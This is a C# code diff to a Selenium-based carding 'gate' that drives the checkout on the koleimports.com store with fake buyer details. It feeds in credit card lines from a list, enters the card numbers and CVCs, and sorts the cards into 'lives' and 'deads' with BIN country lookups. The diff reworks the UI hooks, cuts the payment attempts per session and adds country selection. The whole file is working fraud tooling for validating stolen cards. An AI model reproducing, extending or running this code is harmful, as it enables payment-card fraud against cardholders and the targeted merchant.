@@ -6,6 +6,7 @@ using System.Net;
 using System.Threading;
 using System.Windows.Forms;
 using System.Windows.Forms.VisualStyles;
+using gateBeta;
 using Newtonsoft.Json;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
@@ -124,8 +125,8 @@ namespace gateDanny.gates
                 return;
             }
 
-            var lines = Form1.listCC.Lines.Count();
-            if (lines > 0 && Variables.run==true)
+            
+            if (Thunder._Form1.numcc() > 0 && Variables.run==true)
             {
 
 
@@ -143,7 +144,7 @@ namespace gateDanny.gates
                 driver = new ChromeDriver(chromeDriverService, chromeOptions);
                 driver.Url = "https://www.koleimports.com/catalog/category/view/id/1520";
                 Thread.Sleep(3000);
-                Form1.circularProgressBar1.Value = 5;
+                Thunder._Form1.update_progresbar(5);
                 var producto = "/html/body/div[2]/div/main/div[2]/div/div/div[2]/ol/li[" + RandomNumber(1, 20) + "]";
 
                 try
@@ -171,7 +172,7 @@ namespace gateDanny.gates
 
                     driver.FindElement(By.XPath(producto)).Click();
                     Thread.Sleep(3000);
-                    Form1.circularProgressBar1.Value = 15;
+                    Thunder._Form1.update_progresbar(15);
                     driver.ExecuteJavaScript("document.querySelector('body > div.v-modal > div.v-modal-container.in-product-modal > div > div > div.in-details > div.in-box > div > div > button').click()");
                     Thread.Sleep(3000);
                     driver.ExecuteJavaScript("document.querySelector('#app > div > header > div.navigation > div > div > nav > ul.in-links > li:nth-child(4) > div > div > div.bottom > div:nth-child(2) > div > button.v-btn.v-btn-green').click();");
@@ -180,7 +181,7 @@ namespace gateDanny.gates
 
                 if (tiempoElemento(By.Id("bolt-checkout-frame")))
                 {
-                    Form1.circularProgressBar1.Value = 30;
+                    Thunder._Form1.update_progresbar(30);
                     driver.SwitchTo().Frame(driver.FindElement(By.Id("bolt-checkout-frame")));
 
 
@@ -189,11 +190,14 @@ namespace gateDanny.gates
 
 
                     Thread.Sleep(1000);
-                    Form1.circularProgressBar1.Value = 50;
+                    Thunder._Form1.update_progresbar(50);
                     driver.FindElement(By.Name("fname")).SendKeys("DAVID");
                     driver.FindElement(By.Name("lname")).SendKeys("REYES");
                     driver.FindElement(By.Name("email")).SendKeys(correo);
                     driver.FindElement(By.Name("phone")).SendKeys("2132547896");
+                    var pais = new SelectElement(driver.FindElementById("shippingCountry"));
+                    pais.SelectByValue("US");
+                    Thread.Sleep(600);
                     driver.FindElement(By.Name("notSearchAddrss")).SendKeys("street 643");
                     driver.FindElement(By.Name("ship-city")).SendKeys("New York");
                     driver.FindElement(By.Name("stateSelector")).SendKeys("New York" + Keys.Enter);
@@ -208,7 +212,7 @@ namespace gateDanny.gates
 
                     if (tiempoElemento(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[2]/button")))
                     {
-                        Form1.circularProgressBar1.Value = 55;
+                        Thunder._Form1.update_progresbar(55);
                         driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[2]/button")).Click();
                         Thread.Sleep(200);
                     }
@@ -281,18 +285,18 @@ namespace gateDanny.gates
         {
             try
             {
-                var lines = Form1.listCC.Lines.Count();
+               
                 var num = 1;
 
-                if (lines > 0 && Variables.run==true)
+                if (Thunder._Form1.numcc() > 0 && Variables.run==true)
                 {
-                    if (pagos < 3)
+                    if (pagos < 2)
                     {
-                        string cc = Form1.listCC.Lines[0];
+                        string cc = Thunder._Form1.nextCc();
                         string[] ccLine = cc.Split('|');
                         var ccnum = ccLine[0];
 
-                        Form1.circularProgressBar1.Value = 90;
+                        Thunder._Form1.update_progresbar(90);
                         driver.ExecuteJavaScript("document.querySelector('#ccn').value=''");
                         Thread.Sleep(500);
                         driver.FindElement(By.Name("cardnumber")).SendKeys(ccLine[0]);
@@ -311,7 +315,7 @@ namespace gateDanny.gates
                         }
                         driver.FindElement(By.Name("cvc")).SendKeys(ccv);
 
-                        Thread.Sleep(3000);
+                        Thread.Sleep(1000);
 
                                                      
 
@@ -330,29 +334,28 @@ namespace gateDanny.gates
 
                         if (confirmar())
                         {
-                            Thread.Sleep(300);
-                            Form1.circularProgressBar1.Value = 100;
-                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                            Thunder._Form1.update_progresbar(100);
+                            var pais = checkbin(cc.Substring(0, 6));
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                             check.ccss(Variables.key, guardar, "lives");
-                            Form1.textBox1.AppendText( cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
+                            Thunder._Form1.agrgar_live(" ** APROVADO ** " + cc + " - " + pais);
                             check.playlive();
                             Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                            Form1.textBox1.AppendText(Environment.NewLine);
-                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                            Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
                             restart();
                         }
                         else
                         {
-                            Thread.Sleep(300);
-                            Form1.circularProgressBar1.Value = 100;
-                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                            var pais = checkbin(cc.Substring(0, 6));
+                            Thunder._Form1.update_progresbar(100);
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                             check.ccss(Variables.key, guardar, "deads");
-                            Form1.textBox2.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
+                            Thread.Sleep(300);
+                            Thunder._Form1.agragar_dead(cc);
                             Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                            Form1.textBox2.AppendText(Environment.NewLine);
-                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                            Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
                             pago();
@@ -376,6 +379,10 @@ namespace gateDanny.gates
                 {
                     restart();
                 }
+                else
+                {
+                    stop();
+                }
                
             }
 
@@ -383,10 +390,21 @@ namespace gateDanny.gates
 
         public void stop()
         {
-            pagos = 0;
-            numeroTargeta = 0;
-            driver.Close();
-            driver.Quit();
+            try
+            {
+                pagos = 0;
+                numeroTargeta = 0;
+                driver.Close();
+                driver.Quit();
+                Thunder._Form1.abort();
+            }
+            catch (Exception ex)
+            {
+
+                Console.WriteLine(ex);
+                Thunder._Form1.abort();
+            }
+           
         }
 
         public bool confirmar()
